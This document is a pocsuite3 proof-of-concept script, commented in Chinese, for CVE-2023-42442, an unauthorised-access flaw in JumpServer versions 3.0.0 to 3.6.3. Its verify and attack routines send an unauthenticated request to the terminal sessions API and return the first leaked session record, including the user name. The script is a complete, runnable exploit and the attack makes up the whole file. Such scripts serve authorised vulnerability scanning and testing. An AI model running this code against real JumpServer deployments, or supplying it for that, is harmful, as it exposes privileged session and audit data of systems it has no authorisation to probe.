from collections import OrderedDict
from urllib.parse import urljoin
import re,os,json
from requests_toolbelt import MultipartEncoder
from pocsuite3.api import POCBase, Output, register_poc, logger, requests, OptDict, OptString, VUL_TYPE
from pocsuite3.api import REVERSE_PAYLOAD, POC_CATEGORY


class POC(POCBase):
    vulID = '0'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1'  #默认为1
    author = ['']  #  PoC作者的大名
    vulDate = '2023-9-19'  #漏洞公开的时间,不知道就写今天
    createDate = '2023-9-19'  # 编写 PoC 的日期
    updateDate = '2023-9-19'  # PoC 更新的时间,默认和编写时间一样
    references = ['']  # 漏洞地址来源,0day不用写
    name = 'JumpServer未授权访问'  # PoC 名称
    appPowerLink = ''  # 漏洞厂商主页地址
    appName = 'JumpServer'  # 漏洞应用名称
    appVersion = '''3.0.0 <= JumpServer <= 3.6.3'''  # 漏洞影响版本
    vulType = VUL_TYPE.UNAUTHORIZED_ACCESS  #漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
    JumpServer是一款符合4A规范的开源堡垒机，帮助企业以更安全的方式管控和登录各种类型的资产，实现事前授权、事中监察、事后审计，满足等保合规要求。
    JumpServer 在 3.0.0-3.6.3 版本存在未授权访问漏洞。
    由于系统权限配置存在不合理，导致未授权攻击者可以直接访问 /api/v1/terminal/sessions/ 相关路由。
    JumpServer未授权访问漏洞-CVE-2023-42442
    '''

  # 漏洞简要描述
    samples = ['']  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = ['']  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    pocDesc = '''
    检测:pocsuite -r .\poc++.py -u url(-f url.txt) --verify 
    '''
    category = POC_CATEGORY.EXPLOITS.REMOTE

    def _verify(self):
        result = {}
        path = "/api/v1/terminal/sessions/?limit=1&offset=1"
        url = self.url + path
        headers={
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
            }
        try:
            resq = requests.get(url=url,headers=headers)
            if  resq.status_code == 200:
                text = json.loads(resq.text)['results'][0]['user']
                if text != False:
                    result['VerifyInfo'] = {}
                    result['VerifyInfo']['URL'] = url
                    result['VerifyInfo']['第一条数据'] = json.loads(resq.text)['results'][0]
        except Exception as e:
            return
        return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _shell(self):
        return

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(POC)
